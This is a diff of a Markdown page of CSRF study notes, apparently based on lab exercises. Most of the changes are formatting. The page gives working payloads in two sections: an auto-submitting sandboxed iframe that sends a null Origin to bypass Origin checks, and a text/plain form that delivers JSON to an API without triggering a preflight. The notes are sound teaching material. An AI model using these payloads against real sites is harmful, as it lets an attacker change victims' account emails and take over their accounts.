@@ -158,33 +158,35 @@ When setting a cookie with `SameSite=None`, the website must also include the `S
 
 ## Bypass Origin Header Validation
 
-* Some apps validate the `Origin` header instead of `Referer` - more reliable since it can't be stripped/downgraded by `Referrer-Policy`, but still bypassable.
+* Some apps validate the `Origin` header instead of `Referer` - more reliable since it can't be stripped/downgraded by `Referrer-Policy`, but still bypassed.
 * Browsers send `Origin: null` for requests originating from a sandboxed iframe (without `allow-same-origin`), a `data:` URI, or certain redirect chains - if the server whitelists `null` as an accepted value, this can be abused.
-* **Payload:**
-  ```html
-  <iframe sandbox="allow-forms allow-scripts" srcdoc='
-    <form action="https://vulnerable-website.com/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="attacker@evil-user.net">
-    </form>
-    <script>document.forms[0].submit()</script>
-  '></iframe>
-  ```
+*   **Payload:**
+
+    ```html
+    <iframe sandbox="allow-forms allow-scripts" srcdoc='
+      <form action="https://vulnerable-website.com/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="attacker@evil-user.net">
+      </form>
+      <script>document.forms[0].submit()</script>
+      '>
+    </iframe>
+    ```
 * **Lab** - Confirm the app accepts `Origin: null` (e.g. try sending it in Burp Repeater), then deliver the above sandboxed iframe PoC to the victim.
 
-## CSRF via JSON Endpoints (Content-Type Bypass)
+## CSRF via JSON Endpoints <sup><sub>(Content-Type Bypass)<sub></sup>
 
 * JSON APIs (`Content-Type: application/json`) are normally protected from HTML-form CSRF, since browsers treat this as a non-simple request and issue a CORS preflight (`OPTIONS`) first - if the server doesn't explicitly allow the cross-site origin, the browser blocks the actual request.
 * If the server parses the request body leniently regardless of `Content-Type` (i.e. it still `JSON.parse()`s the body even when sent as `text/plain`), a plain `<form>` submission can bypass the preflight entirely, since `text/plain` is a CORS-safelisted content type and triggers no preflight.
-* **Payload:**
-  ```html
-  <form action="https://vulnerable-website.com/api/change-email" method="POST" enctype="text/plain">
-    <input name='{"email":"attacker@evil-user.net", "ignore_me":"' value='"}'>
-  </form>
-  <script>document.forms[0].submit()</script>
-  ```
+*   **Payload:**
+
+    ```html
+    <form action="https://vulnerable-website.com/api/change-email" method="POST" enctype="text/plain">
+      <input name='{"email":"attacker@evil-user.net", "ignore_me":"' value='"}'>
+    </form>
+    <script>document.forms[0].submit()</script>
+    ```
 * The `text/plain` encoding renders the body as `{"email":"attacker@evil-user.net", "ignore_me":"="}` - most lenient JSON parsers only read the keys they expect and ignore the trailing junk.
 * **Lab** - Confirm the JSON endpoint doesn't validate `Content-Type` strictly, then craft the form with the malformed-JSON technique above.
-
 
 ## References
 
